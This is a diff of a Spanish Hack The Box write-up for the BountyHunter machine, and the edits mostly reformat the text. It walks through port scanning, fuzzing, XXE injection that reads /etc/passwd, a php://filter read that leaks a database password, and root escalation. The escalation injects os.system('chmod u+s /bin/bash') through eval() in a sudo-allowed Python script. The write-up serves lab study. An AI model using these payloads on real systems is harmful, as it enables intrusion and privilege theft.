@@ -16,16 +16,17 @@ tags:
   - BurpSuite
   - XXE Injection
   - Python Vulnerability
-  - SUDO Exploitation
+  - Abusing Sudoers Privilege
   - OSCP Style
 ---
 ![](/assets/images/htb-writeup-bountyhunter/bounty_logo.png)
 
-Esta es una máquina un poco más dificil que las anteriores, siendo que para poder entrar a la página, usaremos **BurpSuite** para obtener las credenciales, una vez dentro, nos aprovecharemos de los permisos sobre un script en Python para poder ganar acceso a la máquina víctima, aquí el análisis del código es vital y de suma importancia, pues debemos saber algo de Python y desarrollo web o al menos entender lo que hacen ciertas partes de la máquina.
+Esta es una máquina un poco más dificil que las anteriores, siendo que para poder entrar a la página, usaremos **BurpSuite** para obtener las credenciales, una vez dentro, nos aprovecharemos de los permisos sobre un script en **Python** para poder ganar acceso a la máquina víctima, aquí el análisis del código es vital y de suma importancia, pues debemos saber algo de Python y desarrollo web o al menos entender lo que hacen ciertas partes de la máquina.
 
-**NOTA:** La verdad en esta máquina me quedé atorado bastante tiempo, por lo que tuve que recurrir a algunos tutoriales sobre cómo resolverla pues después de analizar la página no sabia bien cómo usar **BurpSuite**. Asi que logre solucionarla gracias a **S4vitar** e **IppSec**, grandes maestros de la ciberseguridad. Aqui dejo sus canales de YouTube:
-* Canal de IppSec: https://www.youtube.com/@ippsec
-* Canal de S4vitar: https://www.youtube.com/@s4vitar
+Herramientas utilizadas:
+* *nmap*
+* *burpsuite*
+* *python*
 
 
 <br>
@@ -42,10 +43,11 @@ Esta es una máquina un poco más dificil que las anteriores, siendo que para po
 		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
 			<ul>
 				<li><a href="#HTTP">Analizando Puerto 80</a></li>
-				<li><a href="#Burp">BurpSuite</a></li>
+				<li><a href="#Burp">Configurando BurpSuite</a></li>
 			</ul>
 		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
 			<ul>
+				<li><a href="#Burp2">Aplicando XXE Injection</a></li>
 				<li><a href="#Fuzz">Fuzzing</a></li>
 			</ul>
 		<li><a href="#Post">Post Explotación</a></li>
@@ -72,7 +74,7 @@ Esta es una máquina un poco más dificil que las anteriores, siendo que para po
 <h2 id="Ping">Traza ICMP</h2>
 
 Veamos si la máquina está conectada, además vamos a analizar el TTL para saber que Sistema Operativo usa:
-```
+```bash
 ping -c 4 10.10.11.100            
 PING 10.10.11.100 (10.10.11.100) 56(84) bytes of data.
 64 bytes from 10.10.11.100: icmp_seq=1 ttl=63 time=133 ms
@@ -89,7 +91,7 @@ Por el TTL vemos que la máquina usa Linux. Ahora vamos a hacer un escaneo de pu
 <h2 id="Puertos">Escaneo de Puertos</h2>
 
 Veamos que puertos estan abiertos:
-```
+```bash
 nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.100 -oG allPorts            
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-20 11:12 CST
@@ -111,20 +113,23 @@ Read data files from: /usr/bin/../share/nmap
 Nmap done: 1 IP address (1 host up) scanned in 23.66 seconds
            Raw packets sent: 115632 (5.088MB) | Rcvd: 34152 (1.366MB)
 ```
-* -p-: Para indicarle un escaneo en ciertos puertos.
-* --open: Para indicar que aplique el escaneo en los puertos abiertos.
-* -sS: Para indicar un TCP SYN port Scan para que nos agilice el escaneo.
-* --min-rate: Para indicar una cantidad de envio de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).
-* -vvv: Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.
-* -n: Para indicar que no se aplique resolución dns para agilizar el escaneo.
-* -Pn: Para indicar que se omita el descubrimiento de hosts.
-* -oG: Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.
+
+| Parámetros | Descripción |
+|--------------------------|
+| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
+| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
+| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
+| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
+| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
+| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
+| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
+| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |
 
 Solamente hay dos puertos abiertos, uno con SSH y otro con web abierto. Realicemos un escaneo de servicios, a ver cuáles son.
 
 <h2 id="Servicios">Escaneo de Servicios</h2>
 
-```
+```bash
 nmap -sC -sV -p22,80 10.10.11.100 -oN targeted                               
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-20 11:18 CST
 Nmap scan report for 10.10.11.100
@@ -144,12 +149,15 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 12.39 seconds
 ```
-* -sC: Para indicar un lanzamiento de scripts basicos de reconocimiento.
-* -sV: Para identificar los servicios/version que estan activos en los puertos que se analicen.
-* -p: Para indicar puertos especificos.
-* -oN: Para indicar que el output se guarde en un fichero. Lo llame targeted.
 
-De momento no tenemos credeciales para logearnos en SSH, vamos a revisar la pagina web que esta en el puerto 80.
+| Parámetros | Descripción |
+|--------------------------|
+| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
+| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
+| *-p*       | Para indicar puertos específicos. |
+| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |
+
+De momento no tenemos credeciales para loguearnos en SSH, vamos a revisar la pagina web que esta en el puerto 80.
 
 
 <br>
@@ -174,20 +182,24 @@ Al parecer esta sección no está completa y nos pide ir a otra subpágina, vamo
 
 ![](/assets/images/htb-writeup-bountyhunter/Captura2.png)
 
-Una vez dentro, quizá podamos tratar de inyectar código, probemos utilizando la herramienta **BurpSuite** y nos vamos a utilizar la siguiente página como guía del XXE Injection (XML external entity): 
+Una vez dentro, quizá podamos tratar de inyectar código, probemos utilizando la herramienta **BurpSuite** y nos vamos a utilizar la siguiente página como guía del **XML External Entity (XXE) Injection**: 
 * https://portswigger.net/web-security/xxe
 
 <p align="center">
 <img src="/assets/images/htb-writeup-bountyhunter/Captura3.png">
 </p>
 
-Pero ¿qué es XXE Injection? Bueno esto es:
+Pero ¿qué es **XML External Entity (XXE) Injection**?
 
-**Es una vulnerabilidad de seguridad web que permite a un atacante interferir con el procesamiento de datos XML de una aplicación. A menudo, permite que un atacante vea archivos en el sistema de archivos del servidor de aplicaciones e interactúe con cualquier sistema externo o de back-end al que pueda acceder la propia aplicación.**
+| **XML External Entity (XXE) Injection** |
+|:-----------:|
+| *Es una vulnerabilidad de seguridad web que permite a un atacante interferir con el procesamiento de datos XML de una aplicación. A menudo, permite que un atacante vea archivos en el sistema de archivos del servidor de aplicaciones e interactúe con cualquier sistema externo o de back-end al que pueda acceder la propia aplicación.* |
+
+<br>
 
 Todo esto viene explicado en la página web guía de **BurpSuite**
 
-<h2 id="Burp">BurpSuite</h2>
+<h2 id="Burp">Configurando BurpSuite</h2>
 
 Antes de continuar debemos configurar algunas cosas para que **BurpSuite** vaya sin problemas:
 * Instala en el navegador la herramienta **FoxyProxy**
@@ -233,7 +245,9 @@ Ahora sí, ya estamos listos para trabajar.
 <br>
 
 
-En la última subpágina, llena los campos con lo que quieras y dale **submit** para que **BurpSuite** pueda interceptar la petición, ósea que debemos obtener un POST, que será con el que vamos a seguir trabajando:
+<h2 id="Burp2">Aplicando XXE Injection</h2>
+
+En la última subpágina, llena los campos con lo que quieras y dale al botón **submit** para que **BurpSuite** pueda interceptar la petición, ósea que debemos obtener una **petición POST**, que será con el que vamos a seguir trabajando:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-bountyhunter/Captura8.png">
@@ -257,21 +271,23 @@ Y del **Repeater** vamos a mandar la data al **Decoder**:
 
 ![](/assets/images/htb-writeup-bountyhunter/Captura13.png)
 
-Ya en el **Decoder** lo que haremos será convertir la data que viene hasta abajo a base64:
+Ya en el **Decoder** lo que haremos será convertir la data que viene hasta abajo a **base64**:
 
 ![](/assets/images/htb-writeup-bountyhunter/Captura14.png)
 
-Bien, según la página guía de **BurpSuite**, aquí podemos inyectar código para que nos muestre la carpeta /etc/passwd de la máquina víctima:
+Bien, según la página guía de **BurpSuite**, aquí podemos inyectar código para que nos muestre la carpeta **/etc/passwd** de la máquina víctima:
 
 ![](/assets/images/htb-writeup-bountyhunter/Captura15.png)
 
-Una vez que la data este en base64, lo copiamos, nos vamos al **Repeater**, cambiamos la data por la nueva que acabamos de obtener y enviamos la petición para ver que obtenemos. IMPORTANTE, para que funcione hay que convertir la data a **URL code**, solamente seleccionamos la nueva data y oprimimos **ctrl + u** y ya quedara **URL code**:
+Una vez que la data este en **base64**, lo copiamos, nos vamos al **Repeater**, cambiamos la data por la nueva que acabamos de obtener y enviamos la petición para ver que obtenemos.
+
+**IMPORTANTE**: para que funcione hay que convertir la data a **URL code**, solamente seleccionamos la nueva data y oprimimos **ctrl + u** y ya quedara **URL code**:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-bountyhunter/Captura16.png">
 </p>
 
-Vaya, vaya, al parecer podemos vulnerar la página de esta forma:
+Vaya, al parecer podemos vulnerar la página de esta forma:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-bountyhunter/Captura17.png">
@@ -282,7 +298,7 @@ Incluso, si analizamos bien lo que nos muestra, en la parte de abajo, podemos ve
 Dumper:/:/usr/sbin/nologin
 development:x:1000:1000:Development:/home/development:/bin/bash
 ```
-Pero con esta subpágina no podremos hacer mucho. Ahora lo que vamos a hacer es buscar más subpáginas ocultas, es tiempo de hacer **FUZZING**.
+Pero, con esta subpágina no podremos hacer mucho. Ahora lo que vamos a hacer es buscar más subpáginas ocultas, es tiempo de hacer **FUZZING**.
 
 <h2 id="Fuzz">Fuzzing</h2>
 
@@ -325,12 +341,15 @@ Processed Requests: 5620
 Filtered Requests: 5603
 Requests/sec.: 298.6621
 ```
-* -c: Para que nos muestre los resultados con tono colorizado.
-* --hc=404: Para ocultar este codigo (hc=hide code), es decir, que no lo muestre en el fuzzing 
-* -t 200: Para mandar 200 peticiones para ir más rapido
-* -w: Para utilizar un diccionario o worldlist
-* /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt: Esta es la ubicación del Worldlist
-* http://10.10.11.100/FUZZ.php: Para indicar a donde sera el fuzzing, al final solamente se le agrega FUZZ pero le puedes agregar cosas más especificas, por ejemplo en nuestro caso, vemos que la pagina usa mucho PHP, por lo que agregar .php al final seria bueno para que encuentre subpaginas tipo PHP.
+
+| Parámetros | Descripción |
+|--------------------------|
+| *-c*       | Para ver el resultado en un formato colorido. |
+| *--hc*     | Para no mostrar un código de estado en los resultados. |
+| *-t*       | Para indicar la cantidad de hilos a usar. |
+| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
+
+<br>
 
 Vemos una subpágina a la que no teniamos acceso llama **db**, vamos a checar de que va dicha subpágina.
 
@@ -338,11 +357,13 @@ Vemos una subpágina a la que no teniamos acceso llama **db**, vamos a checar de
 
 Nada, no muestra nada, pero eso quiere decir que si existe y que podemos accesar a ella de alguna manera. Es momento de usar **BurpSuite** otra vez.
 
-Estando en el **Decoder**, podemos indicar en la inyección de código, que podamos ver ciertas páginas dependiendo del **wrapper** que estas usan. Como en este caso se usa PHP, podemos indicarle que nos liste un archivo de PHP en base64 para que nosotros después podamos **deencodear** esa data desde la terminal.
+Estando en el **Decoder**, podemos indicar en la inyección de código, que podamos ver ciertas páginas dependiendo del **wrapper** que estas usan. Como en este caso se usa PHP, podemos indicarle que nos liste un archivo de **PHP en base64** para que nosotros después podamos **deencodear** esa data desde la terminal.
+
+
 Vámonos por pasos:
-* php://filter/convert.base64-encode/: Con este código podemos encodear archivos de php a base64.
-* php://filter/convert.base64-encode/resource=db.php: Con resourse le agregamos la subpagina y ya podemos encodearlo
-* Una vez más mandamos todo a la data del **Repeater**, lo ponemos como **URL code** y lo mandamos.
+* php://filter/convert.base64-encode/ -> Con este código podemos encodear archivos de **PHP a base64**.
+* php://filter/convert.base64-encode/resource=db.php -> Con resourse le agregamos la subpagina y ya podemos encodearlo
+* Una vez más, mandamos todo a la data del **Repeater**, lo ponemos como **URL code** y lo mandamos.
 
 <p align="center">
 <img src="/assets/images/htb-writeup-bountyhunter/Captura19.png">
@@ -350,14 +371,14 @@ Vámonos por pasos:
 
 ![](/assets/images/htb-writeup-bountyhunter/Captura20.png)
 
-Si seleccionamos el resultado que nos arrojó en **BurpSuite**, del lado derecho nos mostrara como se vería sino estuviera en base64:
+Si seleccionamos el resultado que nos arrojó en **BurpSuite**, del lado derecho nos mostrara como se vería sino estuviera en **base64**:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-bountyhunter/Captura21.png">
 </p>
 
-Ojito, nos da una contraseña, recordemos que ya tenemos un usuario, así que intentemos meternos al SSH que está activo en la máquina para ver si podemos accesar:
-```
+Ojito, nos da una contraseña, recordemos que ya tenemos un usuario, así que intentemos meternos al **servicio SSH** que está activo en la máquina para ver si podemos accesar:
+```bash
 ssh development@10.10.11.100
 development@10.10.11.100's password: 
 Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)
@@ -386,7 +407,6 @@ To check for new updates run: sudo apt update
 
 Last login: Wed Jul 21 12:04:13 2021 from 10.10.14.8
 development@bountyhunter:~$ 
-
 ```
 
 
@@ -403,7 +423,7 @@ development@bountyhunter:~$
 
 
 ¡¡ESTAMOS DENTRO!! Es hora de buscar que nos puede ser útil:
-```
+```bash
 development@bountyhunter:~$ ls
 contract.txt  user.txt
 development@bountyhunter:~$ cat contract.txt 
@@ -417,28 +437,32 @@ I set up the permissions for you to test this. Good luck.
 
 -- John
 ```
-Ahí podemos ver la flag del usuario y un mensaje...Entonces hay un script en Python que podemos ejecutar con permiso de Sudoers, quizá podamos utilizarlo para convertirnos en root.
-```
+
+Ahí podemos ver la flag del usuario y un mensaje, este mensaje nos menciona que tenemos permisos especiales sobre un script para testear tickets. Si buscamos que archivos podemos usar que tengan permisos de administrador, vemos que hay un script en **Python** que podemos ejecutar con permiso de Sudoers, quizá podamos utilizarlo para convertirnos en root.
+```bash
 development@bountyhunter:~$ sudo -l
 Matching Defaults entries for development on bountyhunter:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 User development may run the following commands on bountyhunter:
     (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
 ```
+
 Ahí se encuentra el script, y así se usa:
-```
+```bash
 development@bountyhunter:~$ sudo -u root python3.8 /opt/skytrain_inc/ticketValidator.py
 Please enter the path to the ticket file.
 xd
 Wrong file type.
 ```
-Es momento de analizar el script en Python.
+
+Es momento de analizar el script en **Python**.
 
 <h2 id="Script">Análisis de Script</h2>
 
 Vamos a ir deshuesando este script y veremos que hace cada función:
-* En esta función lo que se hace es validar que el archivo sea .md
-```
+
+* En esta función lo que se hace es validar que el archivo sea **.md**
+```python
 Skytrain Inc Ticket Validation System 0.1
 Do not distribute this file.
 def load_file(loc):
@@ -449,8 +473,9 @@ def load_file(loc):
         print("Wrong file type.")
         exit()
 ```
+
 En la siguiente función se hace la validación del ticket:
-```
+```python
 def evaluate(ticketFile):
     #Evaluates a ticket to check for ireggularities.
     code_line = None
@@ -479,19 +504,20 @@ def evaluate(ticketFile):
                     return False
     return False
 ```
-La función lee el ticket, ósea el archivo .md, y debe contener dos cosas principalmente:
+La función lee el ticket, ósea el archivo **.md**, y debe contener dos cosas principalmente:
+
 * Que el archivo empiece con el siguiente comentario:
-```
+```python
 if not x.startswith("# Skytrain Inc"):
                 return False
 ```
 * Que incluya también el siguiente comentario:
-```
+```python
 if not x.startswith("## Ticket to "):
                 return False
 ```
 * Y por último dicho ticket debe incluir lo siguiente:
-```
+```python
 if x.startswith("__Ticket Code:__"):
             code_line = i+1
             continue
@@ -499,28 +525,29 @@ if x.startswith("__Ticket Code:__"):
 
 <h2 id="Ticket">Creando Ticket que Modifica la Bash</h2>
 
-Ahora lo que haremos, será crear un script que valide un ticket, que modifique los permisos de la Bash. Para hacerl, hacemos lo siguiente:
+Ahora lo que haremos, será crear un script que valide un ticket y que por debajo, modifique los permisos de la **Bash** para que podamos usarla, sin ser el administrador. Para hacerlo, hacemos lo siguiente:
 
 Entonces el ticket quedaría así para que sea valido:
-```
+```python
 # Skytrain Inc
 ## Ticket to 
 __Ticket Code:__
 ```
 
 Ahora bien, aquí viene la parte en la que medio coco se me quemo porque no entendía bien que hacía. El ticket debe iniciar con lo siguiente:
-```
+```python
 if not x.startswith("**"):
                 return False
 ```
 Es decir, que va a validar que empice con dos asteriscos, asi: **
 
-La siguiente parte va a reemplazar los asteriscos por nada, ósea "", va a dividir la cadena de de texto con **.split** en donde tenga un + para quedarse solamente con la parte izquierda del ticket:
-```
+La siguiente parte va a reemplazar los asteriscos por una cadena vacia, va a dividir la cadena de texto con **.split** en donde tenga un **signo +** para quedarse solamente con la parte izquierda del ticket:
+```python
 ticketCode = x.replace("**", "").split("+")[0]
 ```
+
 Se entiende mejor si lo muestro en código:
-```
+```python
 python3                                                                                                           
 Python 3.11.2 (main, Feb 12 2023, 00:48:52) [GCC 12.2.0] on linux
 Type "help", "copyright", "credits" or "license" for more information.
@@ -533,30 +560,35 @@ Type "help", "copyright", "credits" or "license" for more information.
 >>> x.replace("**", "").split("+")[0]
 ' kpdos '
 ```
+
 Bien, la siguiente parte va a convertir el código del ticket en número, va a dividir lo que salga entre 7 y el resultado debe dar un residuo de 4:
-```
+```python
 if int(ticketCode) % 7 == 4:
 ```
+
 Un número que nos sirve será el 11, probémoslo:
-```
+```python
 >>> x = "** 11 + cosasxd"
 >>> int(x.replace("**", "").split("+")[0]) % 7
 4
 ```
+
 Entonces si da 4, se hace una evaluación con:
-```
+```python
 validationNumber = eval(x.replace("**", ""))
 ```
-Con eval, si no está bien sanitizado este código, podemos inyectar código pues cuando hace la validación podemos pedirle que nos haga otra cosa aparte:
-```
+
+Con la función **eval()**, si no está bien sanitizado este código, podemos inyectar código pues cuando hace la validación podemos pedirle que nos haga otra cosa aparte:
+```python
 >>> eval("11+69")
 80
 >>> eval("11+69 and __import__('os').system('whoami')")
 root
 0
 ```
+
 ¿Y qué pasaria si lo probamos con nuestro ejemplo? Vamos a ver:
-```
+```python
 >>> x = "** 11 + 80 and __import__('os').system('whoami')"
 >>> int(x.replace("**", "").split("+")[0]) % 7
 4
@@ -564,38 +596,41 @@ root
 root
 0
 ```
-Ufff ahora sabemos cómo inyectar código en la máquina, vamos a crear un archivo en una carpeta, por ejemplo la tmp y agregamos lo que debe llevar el archivo .md:
-```
+
+Ufff ahora sabemos cómo inyectar código en la máquina, vamos a crear un archivo en un directorio, por ejemplo, el directorio **/tmp** y agregamos lo que debe llevar el archivo **.md**:
+```python
 development@bountyhunter:~$ cd /tmp
 development@bountyhunter:/tmp$ nano prueba.md
 ```
-Adentro del archivo prueba.md:
-```
+
+Adentro del archivo **prueba.md**:
+```python
 # Skytrain Inc
 ## Ticket to 
 __Ticket Code:__
 ** 11 + 2 and __import__('os').system('chmod u+s /bin/bash')
 ```
-El **chmod u+s /bin/bash** es para que podamos iniciar bash como root.
+El comando **chmod u+s /bin/bash** es para que podamos iniciar **Bash** como root.
 
-Probamos el script de Python y ya deberíamos poder iniciar un bash como root:
-```
+Probamos el script de **Python** y ya deberíamos poder iniciar un **Bash** como root:
+```bash
 development@bountyhunter:/tmp$ sudo -u root python3.8 /opt/skytrain_inc/ticketValidator.py
 Please enter the path to the ticket file.
 /tmp/prueba.md
 Destination: 
 Invalid ticket.
+```
 
-```
-Comprobamos la bash:
-```
+Comprobamos la **Bash**:
+```bash
 development@bountyhunter:/tmp$ ls -l /bin/bash
 -rwsr-xr-x 1 root root 1183448 Jun 18  2020 /bin/bash
 development@bountyhunter:/tmp$ which bash | xargs ls -l
 -rwsr-xr-x 1 root root 1183448 Jun 18  2020 /usr/bin/bash
 ```
+
 ¡Y ya está! Solo debemos iniciar la consola bash para buscar la flag y terminamos.
-```
+```bash
 development@bountyhunter:/tmp$ bash -p
 bash-5.0# whoami
 root
@@ -604,7 +639,6 @@ bash-5.0# ls
 root.txt  snap
 bash-5.0# exit
 exit
-
 ```
 
 
